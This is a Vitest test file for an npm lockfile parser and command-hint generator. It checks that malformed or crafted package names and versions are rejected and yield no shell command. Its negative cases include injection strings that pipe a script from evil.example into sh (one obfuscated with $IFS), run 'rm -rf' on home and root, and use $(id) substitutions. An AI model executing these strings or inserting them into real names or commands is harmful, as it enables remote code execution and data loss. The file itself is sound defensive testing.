import { describe, expect, it } from 'vitest';
import { npm } from '../../src/domain/ecosystems/npm/index.ts';
import { isValidNpmName } from '../../src/domain/ecosystems/npm/name.ts';
import { parsePackageLock } from '../../src/domain/ecosystems/npm/package-lock.ts';

describe('npm package names from the lockfile', () => {
  it.each(['lodash', '@types/node', 'socket.io-parser', 'lodash.merge', 'JSONStream', 'a', '@s/b_c~d'])('valid: %s', (n) => {
    expect(isValidNpmName(n)).toBe(true);
  });

  it.each([
    'x; curl https://evil.example | sh',
    'x && rm -rf ~',
    '$(id)',
    '`id`',
    "x' --registry=evil",
    'a b',
    '.hidden',
    '_private',
    '@scope/a/b',
    '../escape',
    '',
    'a'.repeat(215),
  ])('invalid: %j', (n) => {
    expect(isValidNpmName(n)).toBe(false);
  });

  it('a crafted alias or name is set aside as invalid_name: never looked up, never a parent, never in paths', () => {
    const evil = 'x;curl$IFS-sL$IFS//evil.example|sh';
    const r = parsePackageLock({
      lockfileVersion: 3,
      packages: {
        '': { dependencies: { [evil]: 'npm:lodash@4.17.20', ok: '1.0.0' } },
        [`node_modules/${evil}`]: { name: 'lodash', version: '4.17.20', dependencies: { qs: '6' } },
        'node_modules/qs': { version: '6.5.2' },
        'node_modules/ok': { version: '1.0.0', dependencies: { qs: '6' } },
        'node_modules/named': { name: 'lodash; rm -rf /', version: '1.0.0' },
      },
    });
    if (r.kind !== 'ok') throw new Error(r.kind);
    expect(r.packages.map((p) => p.name)).toEqual(['ok', 'qs']);
    expect(r.packages.find((p) => p.name === 'qs')).toMatchObject({ directParents: ['ok'], installPaths: [['ok', 'qs']] });
    expect(r.uncheckable).toEqual([
      { name: 'lodash; rm -rf /', version: '1.0.0', reason: 'invalid_name' },
      { name: evil, version: '4.17.20', reason: 'invalid_name' },
    ]);
  });
});

describe('npm commands only from validated names and versions', () => {
  it('valid input → the command', () => {
    expect(npm.hints.upgradeCommand('lodash', '4.17.21')).toBe('npm install lodash@4.17.21');
    expect(npm.hints.upgradeCommand('lodash', '4.17.21', 'my-lodash')).toBe('npm install my-lodash@npm:lodash@4.17.21');
    expect(npm.hints.inspectCommand('@types/node')).toBe('npm ls @types/node');
  });

  it('anything unvalidated → no command at all', () => {
    expect(npm.hints.upgradeCommand('x;id', '1.0.0')).toBeNull();
    expect(npm.hints.upgradeCommand('lodash', '4.17.21;id')).toBeNull();
    expect(npm.hints.upgradeCommand('lodash', '4.17.21 || id')).toBeNull();
    expect(npm.hints.upgradeCommand('lodash', '4.17.21', '$(id)')).toBeNull();
    expect(npm.hints.inspectCommand('a b')).toBeNull();
  });
});
